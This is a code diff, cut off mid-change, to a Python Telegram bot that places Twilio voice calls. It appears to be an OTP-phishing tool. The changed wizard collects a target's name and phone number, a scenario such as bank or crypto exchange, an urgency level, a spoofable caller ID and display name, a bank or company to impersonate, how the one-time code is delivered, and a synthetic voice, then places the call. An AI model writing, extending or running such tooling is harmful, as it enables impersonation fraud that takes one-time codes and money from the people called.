@@ -46,6 +46,27 @@ from core.auth import (
 )
 from services.twilio_service import make_call, make_call_and_store_async, store_call_metadata, get_twilio_client
 
+# ======================================================================
+# SCENARIOS & URGENCY (drives PromptBuilder Stage 2 reason + tone)
+# ======================================================================
+
+SCENARIOS = {
+    "bank": "🏦 Bank/Financial",
+    "crypto": "💰 Crypto Exchange",
+    "ecommerce": "🛒 E-commerce",
+    "email": "📧 Email Provider",
+    "payment": "💳 Payment Service",
+    "social": "📱 Social Media",
+    "corporate": "🏢 Corporate",
+    "other": "🛡️ Other",
+}
+
+URGENCIES = {
+    "high": "🔴 High",
+    "medium": "🟡 Medium",
+    "low": "🟢 Low",
+}
+
 
 def get_voice_mapping() -> dict:
     """Return the authoritative voice mapping from bot.py (populated at runtime)."""
@@ -70,35 +91,107 @@ def init_bot(bot):
     """Compatibility: store telebot instance if the older code injects it."""
     global _telebot_instance
     _telebot_instance = bot
-def step1_name(chat_id: int, user_id: str = None):
-    """Telebot compatibility: start the Normal Call flow for a user.
+def _match_scenario_key(text: str):
+    """Resolve a free-text reply to a scenario key (key, label prefix, or alias)."""
+    t = text.strip().lower()
+    for key in SCENARIOS:
+        if t == key:
+            return key
+    label_map = {
+        "bank": "bank", "financial": "bank", "banking": "bank",
+        "crypto": "crypto", "cryptocurrency": "crypto",
+        "ecommerce": "ecommerce", "e-commerce": "ecommerce", "shop": "ecommerce",
+        "email": "email", "mail": "email",
+        "payment": "payment", "payments": "payment",
+        "social": "social", "social media": "social",
+        "corporate": "corporate", "company": "corporate", "business": "corporate",
+        "other": "other", "generic": "other", "default": "other",
+    }
+    return label_map.get(t)
 
-    If `user_id` is provided, set the legacy state and prompt step 1.
-    """
+
+def _match_urgency_key(text: str):
+    """Resolve a free-text reply to an urgency key."""
+    t = text.strip().lower()
+    if t in ("high", "urgent", "h"):
+        return "high"
+    if t in ("medium", "med", "normal", "m"):
+        return "medium"
+    if t in ("low", "relaxed", "l"):
+        return "low"
+    return None
+
+
+def _scenario_keyboard():
+    from telebot import types as tb_types
+    kb = tb_types.InlineKeyboardMarkup(row_width=2)
+    for key, label in SCENARIOS.items():
+        kb.add(tb_types.InlineKeyboardButton(label, callback_data=f"normal_scenario_{key}"))
+    kb.add(tb_types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_call"))
+    return kb
+
+
+def _urgency_keyboard():
+    from telebot import types as tb_types
+    kb = tb_types.InlineKeyboardMarkup(row_width=1)
+    for key, label in URGENCIES.items():
+        kb.add(tb_types.InlineKeyboardButton(label, callback_data=f"normal_urgency_{key}"))
+    kb.add(tb_types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_call"))
+    return kb
+
+
+def step0_scenario(chat_id: int, user_id: str = None):
+    """Telebot compatibility: start the Normal Call flow with scenario selection."""
     if not _telebot_instance:
         return
     try:
         if user_id:
             ensure_user_path(user_id)
-            set_user_state(user_id, "normal_call_step_1_name")
+            set_user_state(user_id, "normal_call_step_0_scenario")
         _telebot_instance.send_message(
             chat_id,
-            "🎯 VOICE CALL SETUP\n\nStep 1/9: Target Information\nEnter the target's full name:\n— Example: John Smith"
+            "🎯 VOICE CALL SETUP\n\nStep 1/11: Target Scenario\nSelect the target scenario:",
+            reply_markup=_scenario_keyboard(),
         )
     except Exception:
         pass
 
-def generate_voice_preview_compat(chat_id: int, user_id: str):
+
+def step1_name(chat_id: int, user_id: str = None):
+    """Backwards-compatible alias for the scenario-first entry point."""
+    return step0_scenario(chat_id, user_id)
+
+
+def select_normal_scenario(call, user_id: str, chat_id: int, message_id: int):
+    """Write the chosen scenario and advance to phone step."""
     if not _telebot_instance:
         return
-    try:
-        _telebot_instance.send_message(
-            chat_id,
-            "❌ Voice preview is unavailable in the current configuration. "
-            "Voice previews are handled server-side by the new voice provider."
-        )
-    except Exception:
-        pass
+    scenario_key = call.data.replace("normal_scenario_", "")
+    if scenario_key not in SCENARIOS:
+        return
+    write_user_file(user_id, "scenario.txt", scenario_key)
+    set_user_state(user_id, "normal_call_step_1_phone")
+    _telebot_instance.send_message(
+        chat_id,
+        f"💠 Step 2/11: Phone Number\n\n🎯 Scenario: {SCENARIOS[scenario_key]}\nEnter target phone number:\n— Example: +1234567890",
+    )
+
+
+def select_normal_urgency(call, user_id: str, chat_id: int, message_id: int):
+    """Write the chosen urgency and advance to caller ID step."""
+    if not _telebot_instance:
+        return
+    urgency_key = call.data.replace("normal_urgency_", "")
+    if urgency_key not in URGENCIES:
+        return
+    write_user_file(user_id, "urgency.txt", urgency_key)
+    set_user_state(user_id, "normal_call_step_4_callerid")
+    name = read_user_file(user_id, "Name.txt", "Customer")
+    _telebot_instance.send_message(
+        chat_id,
+        f"💠 Step 5/11: Caller ID (Optional)\n\n👤 Name: {name}\n⚡ Urgency: {URGENCIES[urgency_key]}\n\nEnter caller ID number:\n— Example: +1234567890\n— Or send /skip to use the default Twilio number",
+    )
+
 
 def show_preview_and_confirm_compat(chat_id: int, user_id: str):
     """Telebot-compatible: show the script summary and action buttons.
@@ -114,17 +207,16 @@ def show_preview_and_confirm_compat(chat_id: int, user_id: str):
         summary = format_call_summary(user_id)
 
         from telebot import types as tb_types
-        kb = tb_types.InlineKeyboardMarkup()
+        kb = tb_types.InlineKeyboardMarkup(row_width=2)
         kb.add(tb_types.InlineKeyboardButton("📞 INITIATE CALL", callback_data="normal_confirm"))
         kb.add(tb_types.InlineKeyboardButton("📅 Schedule", callback_data="normal_schedule"))
-        kb.add(tb_types.InlineKeyboardButton("🎧 Preview Voice", callback_data="normal_preview_voice"))
-        kb.add(tb_types.InlineKeyboardButton("✏️ Edit All", callback_data="normal_edit"))
         kb.add(tb_types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_call"))
 
         _telebot_instance.send_message(
             chat_id,
             f"{summary}\n\n`     Tap INITIATE CALL to start.     `",
             reply_markup=kb,
+            parse_mode="Markdown",
         )
     except Exception:
         try:
@@ -141,35 +233,45 @@ def handle_normal_step(chat_id: int, user_id: str, state: str, text: str):
     if not _telebot_instance:
         return None
 
-    if state == "normal_call_step_1_name":
-        if not text.strip():
-            _telebot_instance.send_message(chat_id, "❌ Name cannot be empty.")
+    if state == "normal_call_step_0_scenario":
+        key = _match_scenario_key(text.strip())
+        if not key:
+            _telebot_instance.send_message(chat_id, "❌ Scenario not recognized. Tap a scenario button above.")
             return False
-        write_user_file(user_id, "Name.txt", text.strip())
-        set_user_state(user_id, "normal_call_step_2_company")
-        _telebot_instance.send_message(chat_id, f"💠 Step 2/9: Company Information\n\nName: {text.strip()}\nEnter company/bank name:\n— Example: Chase Bank")
+        write_user_file(user_id, "scenario.txt", key)
+        set_user_state(user_id, "normal_call_step_1_phone")
+        _telebot_instance.send_message(chat_id, f"💠 Step 2/11: Phone Number\n\n🎯 Scenario: {SCENARIOS[key]}\nEnter target phone number:\n— Example: +1234567890")
         return True
 
-    if state == "normal_call_step_2_company":
-        if not text.strip():
-            _telebot_instance.send_message(chat_id, "❌ Company cannot be empty.")
-            return False
-        write_user_file(user_id, "Company Name.txt", text.strip())
-        set_user_state(user_id, "normal_call_step_3_phone")
-        name = read_user_file(user_id, "Name.txt", "Customer")
-        _telebot_instance.send_message(chat_id, f"💠 Step 3/9: Phone Number\n\nName: {name}\nCompany: {text.strip()}\nEnter target phone number:\n— Example: +1234567890")
-        return True
-
-    if state == "normal_call_step_3_phone":
+    if state == "normal_call_step_1_phone":
         phone = format_phone(text.strip())
         if not phone or len(re.sub(r'\D', '', phone)) < 10:
             _telebot_instance.send_message(chat_id, "❌ Invalid phone format. Use +1234567890")
             return False
         write_user_file(user_id, "phonenum.txt", phone)
+        set_user_state(user_id, "normal_call_step_2_name")
+        scenario = read_user_file(user_id, "scenario.txt", SCENARIOS["other"])
+        _telebot_instance.send_message(chat_id, f"💠 Step 3/11: Target Information\n\n🎯 Scenario: {scenario}\n📞 Phone: {phone}\nEnter the target's full name:\n— Example: John Smith")
+        return True
+
+    if state == "normal_call_step_2_name":
+        if not text.strip():
+            _telebot_instance.send_message(chat_id, "❌ Name cannot be empty.")
+            return False
+        write_user_file(user_id, "Name.txt", text.strip())
+        set_user_state(user_id, "normal_call_step_3_urgency")
+        _telebot_instance.send_message(chat_id, f"💠 Step 4/11: Urgency Level\n\n👤 Name: {text.strip()}\nSet urgency level:", reply_markup=_urgency_keyboard())
+        return True
+
+    if state == "normal_call_step_3_urgency":
+        key = _match_urgency_key(text.strip())
+        if not key:
+            _telebot_instance.send_message(chat_id, "❌ Reply HIGH, MEDIUM, or LOW.")
+            return False
+        write_user_file(user_id, "urgency.txt", key)
         set_user_state(user_id, "normal_call_step_4_callerid")
         name = read_user_file(user_id, "Name.txt", "Customer")
-        company = read_user_file(user_id, "Company Name.txt", "your bank")
-        _telebot_instance.send_message(chat_id, f"💠 Step 4/9: Caller ID (Optional)\n\nName: {name}\nCompany: {company}\nPhone: {phone}\n\nEnter caller ID number:\n— Example: +1234567890\n— Or send /skip to use the default Twilio number")
+        _telebot_instance.send_message(chat_id, f"💠 Step 5/11: Caller ID (Optional)\n\n👤 Name: {name}\n⚡ Urgency: {URGENCIES[key]}\n\nEnter caller ID number:\n— Example: +1234567890\n— Or send /skip to use the default Twilio number")
         return True
 
     if state == "normal_call_step_4_callerid":
@@ -187,8 +289,7 @@ def handle_normal_step(chat_id: int, user_id: str, state: str, text: str):
         write_user_file(user_id, "Caller ID.txt", caller)
         set_user_state(user_id, "normal_call_step_5_fromname")
         name = read_user_file(user_id, "Name.txt", "Customer")
-        company = read_user_file(user_id, "Company Name.txt", "your bank")
-        _telebot_instance.send_message(chat_id, f"💠 Step 5/9: Display Name\n\nName: {name}\nCompany: {company}\nCaller ID: {caller or TWILIO_PHONE_NUMBER}\n\nEnter display name (shown on caller ID):\n— Example: Support Team")
+        _telebot_instance.send_message(chat_id, f"💠 Step 6/11: Display Name\n\n👤 Name: {name}\n📞 Caller ID: {caller or TWILIO_PHONE_NUMBER}\n\nEnter display name (shown on caller ID):\n— Example: Support Team")
         return True
 
     if state == "normal_call_step_5_fromname":
@@ -196,40 +297,52 @@ def handle_normal_step(chat_id: int, user_id: str, state: str, text: str):
             _telebot_instance.send_message(chat_id, "❌ Display name cannot be empty.")
             return False
         write_user_file(user_id, "From Name.txt", text.strip())
-        set_user_state(user_id, "normal_call_step_6_language")
-        _telebot_instance.send_message(chat_id, "💠 Step 6/9: Language\n\nChoose the call language:\nEN – English\nFR – Français")
+        set_user_state(user_id, "normal_call_step_6_company")
+        name = read_user_file(user_id, "Name.txt", "Customer")
+        _telebot_instance.send_message(chat_id, f"💠 Step 7/11: Company Information\n\n👤 Name: {name}\n🏷️ Display Name: {text.strip()}\nEnter company/bank name:\n— Example: Chase Bank")
         return True
 
-    if state == "normal_call_step_6_language":
+    if state == "normal_call_step_6_company":
+        if not text.strip():
+            _telebot_instance.send_message(chat_id, "❌ Company cannot be empty.")
+            return False
+        write_user_file(user_id, "Company Name.txt", text.strip())
+        set_user_state(user_id, "normal_call_step_7_language")
+        name = read_user_file(user_id, "Name.txt", "Customer")
+        company = text.strip()
+        _telebot_instance.send_message(chat_id, f"💠 Step 8/11: Language\n\n🏢 Company: {company}\nChoose the call language:\nEN – English\nFR – Français")
+        return True
+
+    if state == "normal_call_step_7_language":
         lang = text.strip().lower()
         if lang not in ("en", "fr"):
             _telebot_instance.send_message(chat_id, "❌ Reply EN or FR.")
             return False
         write_user_file(user_id, "Language.txt", lang)
-        set_user_state(user_id, "normal_call_step_7_delivery")
-        _telebot_instance.send_message(chat_id, "💠 Step 7/9: Delivery Method\n\nHow will the OTP be delivered?\nSMS – Text message\nEMAIL – Email")
+        set_user_state(user_id, "normal_call_step_8_delivery")
+        _telebot_instance.send_message(chat_id, "💠 Step 9/11: Delivery Method\n\nHow will the OTP be delivered?\nSMS – Text message\nEMAIL – Email")
         return True
 
-    if state == "normal_call_step_7_delivery":
+    if state == "normal_call_step_8_delivery":
         delivery = text.strip().lower()
         if delivery not in ("sms", "email"):
             _telebot_instance.send_message(chat_id, "❌ Reply SMS or EMAIL.")
             return False
         write_user_file(user_id, "Delivery.txt", delivery)
-        set_user_state(user_id, "normal_call_step_8_digits")
-        _telebot_instance.send_message(chat_id, "💠 Step 8/9: OTP Code Length\n\nEnter the number of digits (4-10):\n— Example: 6")
+        set_user_state(user_id, "normal_call_step_9_digits")
+        _telebot_instance.send_message(chat_id, "💠 Step 10/11: OTP Code Length\n\nEnter the number of digits (4-10):\n— Example: 6")
         return True
 
-    if state == "normal_call_step_8_digits":
+    if state == "normal_call_step_9_digits":
         if not text.strip().isdigit() or not (4 <= int(text.strip()) <= 10):
             _telebot_instance.send_message(chat_id, "❌ Enter a number between 4 and 10.")
             return False
         write_user_file(user_id, "Digits.txt", text.strip())
         write_user_file(user_id, "CodeLength.txt", text.strip())
-        set_user_state(user_id, "normal_call_step_9_voice")
+        set_user_state(user_id, "normal_call_step_10_voice")
         vm = get_voice_mapping()
         lines = [
-            "🎤 Step 9/9: Voice Selection",
+            "🎤 Step 11/11: Voice Selection",
             "",
             "Reply with the number or name to select a voice.",
             "",
@@ -240,7 +353,7 @@ def handle_normal_step(chat_id: int, user_id: str, state: str, text: str):
         _telebot_instance.send_message(chat_id, "\n".join(lines))
         return True
 
-    if state == "normal_call_step_9_voice":
+    if state == "normal_call_step_10_voice":
         choice = text.strip()
         found = False
         voice_id = None
@@ -276,18 +389,16 @@ def handle_normal_step(chat_id: int, user_id: str, state: str, text: str):
     return None
 
 
-# Backwards-compatible names expected by the older telebot-based code
-def generate_voice_preview(chat_id: int, user_id: str):
-    return generate_voice_preview_compat(chat_id, user_id)
-
-
-# Conversation states (maintain 9 steps plus extras)
+# Conversation states (maintain scenario-first flow: scenario → phone → name → urgency
+# → caller id → display name → company → language → delivery → digits → voice)
 (
-    NORMAL_NAME,
-    NORMAL_COMPANY,
+    NORMAL_SCENARIO,
     NORMAL_PHONE,
+    NORMAL_NAME,
+    NORMAL_URGENCY,
     NORMAL_CALLER_ID,
     NORMAL_FROM_NAME,
+    NORMAL_COMPANY,
     NORMAL_LANGUAGE,
     NORMAL_DELIVERY,
     NORMAL_DIGITS,
@@ -295,7 +406,7 @@ def generate_voice_preview(chat_id: int, user_id: str):
     NORMAL_PREVIEW,
     NORMAL_SCHEDULE,
     NORMAL_CONFIRM,
-) = range(12)
+) = range(14)
 
 
 # ======================================================================
@@ -367,9 +478,15 @@ def format_call_summary(user_id: str) -> str:
     delivery = read_user_file(user_id, "Delivery.txt", "sms").upper()
     digits = read_user_file(user_id, "Digits.txt", "6")
     voice_name = read_user_file(user_id, "VoiceName.txt", "Hannah (US)")
+    scenario_key = read_user_file(user_id, "scenario.txt", "").strip()
+    urgency_key = read_user_file(user_id, "urgency.txt", "").strip()
+    scenario_label = SCENARIOS.get(scenario_key, "Other")
+    urgency_label = URGENCIES.get(urgency_key, "Medium")
     return (
         f"📋 *CALL READY*\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"🎯 Scenario: *{scenario_label}*\n"
+        f"⚡ Urgency: *{urgency_label}*\n"
         f"👤 Target: *{name}*\n"
         f"🏢 Company: *{company}*\n"
         f"📞 Phone: `{phone}`\n"
@@ -390,48 +507,54 @@ def format_call_summary(user_id: str) -> str:
 # ======================================================================
 
 async def normal_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Step 1/9: Target Name."""
+    """Step 1/11: Scenario selection."""
+    user_id = str(update.effective_user.id)
+    ensure_user_path(user_id)
+    set_user_state(user_id, "normal_call_step_0_scenario")
+    keyboard = []
+    row = []
+    for key, label in SCENARIOS.items():
+        row.append(InlineKeyboardButton(label, callback_data=f"normal_scenario_{key}"))
+        if len(row) >= 2:
+            keyboard.append(row)
+            row = []
+    if row:
+        keyboard.append(row)
+    keyboard.append([InlineKeyboardButton("❌ Cancel", callback_data="cancel_call")])
     await update.message.reply_text(
         "🎯 *VOICE CALL SETUP*\n\n"
-        "Step 1/9: Target Information\n"
-        "Enter the target's full name:\n"
-        "— Example: John Smith",
+        "Step 1/11: Target Scenario\n"
+        "Select the target scenario:",
+        reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode="Markdown"
     )
-    return NORMAL_NAME
+    return NORMAL_SCENARIO
 
 
-async def normal_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def normal_scenario(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Step 1/11 (input): Store scenario, ask for phone."""
     user_id = str(update.effective_user.id)
-    text = update.message.text.strip()
-    if not text:
-        await update.message.reply_text("❌ Name cannot be empty.")
-        return NORMAL_NAME
-    write_user_file(user_id, "Name.txt", text)
-    set_user_state(user_id, "normal_call_step_2_company")
-    await update.message.reply_text(
-        f"💠 Step 2/9: Company Information\n\n"
-        f"Name: *{text}*\n"
-        f"Enter company/bank name:\n"
-        f"— Example: Chase Bank",
-        parse_mode="Markdown"
-    )
-    return NORMAL_COMPANY
-
-
-async def normal_company(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = str(update.effective_user.id)
-    text = update.message.text.strip()
-    if not text:
-        await update.message.reply_text("❌ Company cannot be empty.")
-        return NORMAL_COMPANY
-    write_user_file(user_id, "Company Name.txt", text)
-    set_user_state(user_id, "normal_call_step_3_phone")
-    name = read_user_file(user_id, "Name.txt", "Customer")
-    await update.message.reply_text(
-        f"💠 Step 3/9: Phone Number\n\n"
-        f"Name: *{name}*\n"
-        f"Company: *{text}*\n"
+    msg = None
+    if update.callback_query:
+        await update.callback_query.answer()
+        data = update.callback_query.data.replace("normal_scenario_", "")
+        if data not in SCENARIOS:
+            await update.callback_query.message.reply_text("❌ Invalid scenario.")
+            return NORMAL_SCENARIO
+        key = data
+        msg = update.callback_query.message
+    else:
+        text = update.message.text.strip()
+        key = _match_scenario_key(text)
+        if not key:
+            await update.message.reply_text("❌ Scenario not recognized. Tap a scenario button above.")
+            return NORMAL_SCENARIO
+        msg = update.message
+    write_user_file(user_id, "scenario.txt", key)
+    set_user_state(user_id, "normal_call_step_1_phone")
+    await msg.reply_text(
+        f"💠 Step 2/11: Phone Number\n\n"
+        f"🎯 Scenario: *{SCENARIOS[key]}*\n"
         f"Enter target phone number:\n"
         f"— Example: +1234567890",
         parse_mode="Markdown"
@@ -440,6 +563,7 @@ async def normal_company(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def normal_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Step 2/11: Phone number, ask for name."""
     user_id = str(update.effective_user.id)
     raw = update.message.text.strip()
     phone = format_phone(raw)
@@ -452,14 +576,67 @@ async def normal_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return NORMAL_PHONE
     write_user_file(user_id, "phonenum.txt", phone)
+    set_user_state(user_id, "normal_call_step_2_name")
+    scenario = read_user_file(user_id, "scenario.txt", SCENARIOS["other"])
+    await update.message.reply_text(
+        f"💠 Step 3/11: Target Information\n\n"
+        f"🎯 Scenario: *{scenario}*\n"
+        f"📞 Phone: `{phone}`\n"
+        f"Enter the target's full name:\n"
+        f"— Example: John Smith",
+        parse_mode="Markdown"
+    )
+    return NORMAL_NAME
+
+
+async def normal_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Step 3/11: Target name, ask for urgency."""
+    user_id = str(update.effective_user.id)
+    text = update.message.text.strip()
+    if not text:
+        await update.message.reply_text("❌ Name cannot be empty.")
+        return NORMAL_NAME
+    write_user_file(user_id, "Name.txt", text)
+    set_user_state(user_id, "normal_call_step_3_urgency")
+    keyboard = []
+    for key, label in URGENCIES.items():
+        keyboard.append([InlineKeyboardButton(label, callback_data=f"normal_urgency_{key}")])
+    await update.message.reply_text(
+        f"💠 Step 4/11: Urgency Level\n\n"
+        f"👤 Name: *{text}*\n"
+        f"Set urgency level:",
+        reply_markup=InlineKeyboardMarkup(keyboard),
+        parse_mode="Markdown"
+    )
+    return NORMAL_URGENCY
+
+
+async def normal_urgency(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Step 4/11 (input): Store urgency, ask for caller ID."""
+    user_id = str(update.effective_user.id)
+    msg = None
+    if update.callback_query:
+        await update.callback_query.answer()
+        data = update.callback_query.data.replace("normal_urgency_", "")
+        if data not in URGENCIES:
+            await update.callback_query.message.reply_text("❌ Invalid urgency.")
+            return NORMAL_URGENCY
+        key = data
+        msg = update.callback_query.message
+    else:
+        text = update.message.text.strip()
+        key = _match_urgency_key(text)
+        if not key:
+            await update.message.reply_text("❌ Reply HIGH, MEDIUM, or LOW.")
+            return NORMAL_URGENCY
+        msg = update.message
+    write_user_file(user_id, "urgency.txt", key)
     set_user_state(user_id, "normal_call_step_4_callerid")
     name = read_user_file(user_id, "Name.txt", "Customer")
-    company = read_user_file(user_id, "Company Name.txt", "your bank")
-    await update.message.reply_text(
-        f"💠 Step 4/9: Caller ID (Optional)\n\n"
-        f"Name: *{name}*\n"
-        f"Company: *{company}*\n"
-        f"Phone: `{phone}`\n\n"
+    await msg.reply_text(
+        f"💠 Step 5/11: Caller ID (Optional)\n\n"
+        f"👤 Name: *{name}*\n"
+        f"⚡ Urgency: *{URGENCIES[key]}*\n"
         f"Enter caller ID number:\n"
         f"— Example: +1234567890\n"
         f"— Or send /skip to use the default Twilio number",
@@ -469,6 +646,7 @@ async def normal_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def normal_caller_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Step 5/11: Caller ID, ask for display name."""
     user_id = str(update.effective_user.id)
     text = update.message.text.strip()
     if text.lower() == '/skip' or not text:
@@ -490,12 +668,10 @@ async def normal_caller_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
     write_user_file(user_id, "Caller ID.txt", caller_id)
     set_user_state(user_id, "normal_call_step_5_fromname")
     name = read_user_file(user_id, "Name.txt", "Customer")
-    company = read_user_file(user_id, "Company Name.txt", "your bank")
     await update.message.reply_text(
-        f"💠 Step 5/9: Display Name\n\n"
-        f"Name: *{name}*\n"
-        f"Company: *{company}*\n"
-        f"Caller ID: `{caller_id or TWILIO_PHONE_NUMBER}`\n\n"
+        f"💠 Step 6/11: Display Name\n\n"
+        f"👤 Name: *{name}*\n"
+        f"📞 Caller ID: `{caller_id or TWILIO_PHONE_NUMBER}`\n"
         f"Enter display name (shown on caller ID):\n"
         f"— Example: Support Team",
         parse_mode="Markdown"
@@ -504,33 +680,57 @@ async def normal_caller_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def normal_from_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Step 6/11: Display name, ask for company."""
     user_id = str(update.effective_user.id)
     text = update.message.text.strip()
     if not text:
         await update.message.reply_text("❌ Display name cannot be empty.")
         return NORMAL_FROM_NAME
     write_user_file(user_id, "From Name.txt", text)
-    set_user_state(user_id, "normal_call_step_6_language")
+    set_user_state(user_id, "normal_call_step_6_company")
+    name = read_user_file(user_id, "Name.txt", "Customer")
     await update.message.reply_text(
-        "💠 Step 6/9: Language\n\n"
-        "Choose the call language:\n"
-        "🇺🇸 EN – English\n"
-        "🇫🇷 FR – Français",
+        f"💠 Step 7/11: Company Information\n\n"
+        f"👤 Name: *{name}*\n"
+        f"🏷️ Display Name: *{text}*\n"
+        f"Enter company/bank name:\n"
+        f"— Example: Chase Bank",
+        parse_mode="Markdown"
+    )
+    return NORMAL_COMPANY
+
+
+async def normal_company(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Step 7/11: Company, ask for language."""
+    user_id = str(update.effective_user.id)
+    text = update.message.text.strip()
+    if not text:
+        await update.message.reply_text("❌ Company cannot be empty.")
+        return NORMAL_COMPANY
+    write_user_file(user_id, "Company Name.txt", text)
+    set_user_state(user_id, "normal_call_step_7_language")
+    await update.message.reply_text(
+        f"💠 Step 8/11: Language\n\n"
+        f"🏢 Company: *{text}*\n"
+        f"Choose the call language:\n"
+        f"🇺🇸 EN – English\n"
+        f"🇫🇷 FR – Français",
         parse_mode="Markdown"
     )
     return NORMAL_LANGUAGE
 
 
 async def normal_language(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Step 8/11: Language, ask for delivery."""
     user_id = str(update.effective_user.id)
     text = update.message.text.strip().lower()
     if text not in ['en', 'fr']:
         await update.message.reply_text("❌ Reply with `EN` or `FR`.")
         return NORMAL_LANGUAGE
     write_user_file(user_id, "Language.txt", text)
-    set_user_state(user_id, "normal_call_step_7_delivery")
+    set_user_state(user_id, "normal_call_step_8_delivery")
     await update.message.reply_text(
-        "💠 Step 7/9: Delivery Method\n\n"
+        "💠 Step 9/11: Delivery Method\n\n"
         "How will the OTP be delivered?\n"
         "📱 SMS – Text message\n"
         "📧 EMAIL – Email",
@@ -540,15 +740,16 @@ async def normal_language(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def normal_delivery(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Step 9/11: Delivery, ask for digits."""
     user_id = str(update.effective_user.id)
     text = update.message.text.strip().lower()
     if text not in ['sms', 'email']:
         await update.message.reply_text("❌ Reply with `SMS` or `EMAIL`.")
         return NORMAL_DELIVERY
     write_user_file(user_id, "Delivery.txt", text)
-    set_user_state(user_id, "normal_call_step_8_digits")
+    set_user_state(user_id, "normal_call_step_9_digits")
     await update.message.reply_text(
-        "💠 Step 8/9: OTP Code Length\n\n"
+        "💠 Step 10/11: OTP Code Length\n\n"
         "Enter the number of digits (4‑10):\n"
         "— Example: 6",
         parse_mode="Markdown"
@@ -557,6 +758,7 @@ async def normal_delivery(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def normal_digits(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Step 10/11: Digits, ask for voice."""
     user_id = str(update.effective_user.id)
     text = update.message.text.strip()
     if not text.isdigit() or not (4 <= int(text) <= 10):
@@ -564,9 +766,7 @@ async def normal_digits(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return NORMAL_DIGITS
     write_user_file(user_id, "Digits.txt", text)
     write_user_file(user_id, "CodeLength.txt", text)
-    set_user_state(user_id, "normal_call_step_9_voice")
-    selected_voice_id = read_user_file(user_id, "Voice.txt", "")
-    # Build a simple keyboard from VOICE_MAPPING
+    set_user_state(user_id, "normal_call_step_10_voice")
     keyboard = []
     row = []
     vm = get_voice_mapping()
@@ -579,7 +779,7 @@ async def normal_digits(update: Update, context: ContextTypes.DEFAULT_TYPE):
         keyboard.append(row)
     voice_lines = [f"{k}. {v.get('name')} — {v.get('desc', '')}" for k, v in sorted(vm.items(), key=lambda x: int(x[0]))]
     await update.message.reply_text(
-        "🎤 Step 9/9: Voice Selection\n\n"
+        "🎤 Step 11/11: Voice Selection\n\n"
         "Choose a voice by tapping a button or replying with number/name.\n\n"
         + "\n".join(voice_lines),
         reply_markup=InlineKeyboardMarkup(keyboard),
@@ -618,12 +818,6 @@ async def normal_voice_callback(update: Update, context: ContextTypes.DEFAULT_TY
         await initiate_call_from_query(query, user_id)
         return
 
-    elif data == 'normal_edit':
-        clear_user_state(user_id)
-        await query.edit_message_text("🔄 Returning to step 1. Please start over.")
-        await normal_start(update, context)
-        return
-
     elif data == 'normal_schedule':
         set_user_state(user_id, "normal_schedule")
         await query.edit_message_text(
@@ -635,17 +829,6 @@ async def normal_voice_callback(update: Update, context: ContextTypes.DEFAULT_TY
         )
         return NORMAL_SCHEDULE
 
-    elif data == 'normal_preview_voice':
-        voice_id = read_user_file(user_id, "Voice.txt", DEFAULT_VOICE_ID)
-        sample_text = "Hello, this is a preview of the selected voice."
-        sample_path = user_conf_path(user_id) / "voice_preview.mp3"
-        success = False
-        if success and sample_path.exists():
-            await query.message.reply_audio(open(sample_path, 'rb'), caption="🎧 Voice preview")
-        else:
-            await query.message.reply_text("❌ Failed to generate voice preview.")
-        return
-
 
 async def show_preview_and_confirm(query, user_id: str):
     """Show script preview, cost, and action buttons."""
@@ -654,10 +837,10 @@ async def show_preview_and_confirm(query, user_id: str):
 
     keyboard = [
         [InlineKeyboardButton("📞 INITIATE CALL", callback_data="normal_confirm")],
-        [InlineKeyboardButton("📅 Schedule", callback_data="normal_schedule")],
-        [InlineKeyboardButton("🎧 Preview Voice", callback_data="normal_preview_voice")],
-        [InlineKeyboardButton("✏️ Edit All", callback_data="normal_edit")],
-        [InlineKeyboardButton("❌ Cancel", callback_data="cancel_call")],
+        [
+            InlineKeyboardButton("📅 Schedule", callback_data="normal_schedule"),
+            InlineKeyboardButton("❌ Cancel", callback_data="cancel_call"),
+        ],
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
 
@@ -676,6 +859,21 @@ async def show_preview_and_confirm(query, user_id: str):
 # ======================================================================
 # CALL INITIATION WITH VOICEMAIL/HUMAN DETECTION
 # ======================================================================
+
+def initiate_call(chat_id: int, user_id: str, call_from_user=None, status_message_id=None, mode_label: Optional[str] = None):
+    """Compatibility entry point that delegates to bot.initiate_normal_call.
+
+    Kept as a distinct sync wrapper so the PTB async path (initiate_call_from_query)
+    and the live telebot path (initiate_normal_call) remain clearly separated.
+    """
+    try:
+        from bot import initiate_normal_call
+        if mode_label is None:
+            mode_label = "Normal Call"
+        return initiate_normal_call(chat_id, user_id, call_from_user, status_message_id, mode_label)
+    except Exception:
+        return None
+
 
 async def initiate_call_from_query(query, user_id: str):
     """Place the call with async AMD and real-time user notifications."""
@@ -813,11 +1011,19 @@ def get_normal_call_conversation_handler():
     conv_handler = ConversationHandler(
         entry_points=[CommandHandler("normal", normal_start)],
         states={
-            NORMAL_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, normal_name)],
-            NORMAL_COMPANY: [MessageHandler(filters.TEXT & ~filters.COMMAND, normal_company)],
+            NORMAL_SCENARIO: [
